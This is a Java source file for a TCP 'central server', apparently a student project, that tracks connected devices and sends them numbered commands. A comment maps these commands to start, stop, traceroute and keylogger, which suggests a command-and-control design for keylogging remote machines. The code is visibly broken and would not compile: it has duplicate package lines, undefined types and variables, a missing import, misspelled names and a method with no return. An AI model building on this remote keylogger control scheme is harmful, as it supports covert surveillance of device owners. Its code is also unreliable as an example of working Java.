package server;
package bdn;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

/**
 * @author Leo Reyes
 * @author Rizwan Pirani
 *
 *	This class represents the central server. All controllers and sockets are 
 *	initiated in this class. When a new connection is made with the socket, a
 *	new thread is created to manage the connection to that particular socket.
 */
public class Server {
	// Socket connection to server
	private static ServerSocket serverSock;
	// Socket connection to device
	private static Socket deviceSock;
	// List of connections to devices
	private static ArrayList<TCPDeviceThread> deviceConnections = new ArrayList<TCPDeviceThread>();
	// Server request handler, observer checking for new requests
	private static final RequestHandler requestHandler = new RequestHandler();
	// Server device controller
	private static final DeviceController deviceController = new DeviceController();
	// Server Database controller
	private static final DBController dbController = new DBController();
	
	/*
	 * Creates a server, initializes and starts controllers
	 */
	public Server() {
		try {
			serverSock = new ServerSocket(10011);
			requestHandler.addDeviceController(deviceController);
			requestHandler.addDbController(dbController);
			new Thread(requestHandler).start();
		}
		catch(IOException e) {
			System.out.println(e);
		}
	}
	
	/*
	 * TODO: finish method, finds a connection in the list of threads that 
	 * 		 corresponds with a parameter
	 */
	public static TCPDeviceThread findDeviceThread(Strings id, byte temp) 
	{
		//string id find thread that has device and send it a message 
		//from the threads that are in the array list
		/*0 starts 
		1 stops
		2 traceroute
		3 keylogger*/
		
		BufferedOutputStream bos = new BufferedOutputStream(connection.getOutputStream());
		
		for(int i = 0; i < deviceConnections.size(); i++) 
		{
			if(deviceConnections.get(i).getId().equalsIgnoreCase(id)) 
			{
				bos.write(temp);
				System.out.println("Device found!");
			}
			else 
			{
				System.out.println("Device not found!");
			}
		}
	}
	
	/*
	 * THE driver
	 */
	public static void main(String args[]) {
		
		Server server = new Server();
		// Continuously waits for a connection to create a new connection thread
		while(true) {
			try {
				System.out.println("Connected clients: " + deviceConnections.size());
				System.out.println("List: " + deviceConnections.toString());
				System.out.println("\nwaiting for connection");
				// Listen for a connection to server
				deviceSock = serverSock.accept();
				// Create new thread for connection
				TCPDeviceThread newThread = new TCPDeviceThread(deviceSock, requestHandler, deviceController);
				// Add new connection thread to list
				deviceConnections.add(newThread);
				// Start thread
				newThread.start();
				Thread.sleep(1000);
				findDeviceThread(deviceConections.get(0).getID(), 0);
				Thread.sleep(1000);
				findDeviceThread(deviceConections.get(0).getID(), 1);
				Thread.sleep(1000);
				findDeviceThread(deviceConections.get(0).getID(), 2);
				Thread.sleep(1000);
				findDeviceThread(deviceConections.get(0).getID(), 3);
			} 
			catch (Exception e) {
				System.out.println(e);
			}
		}
	}
}
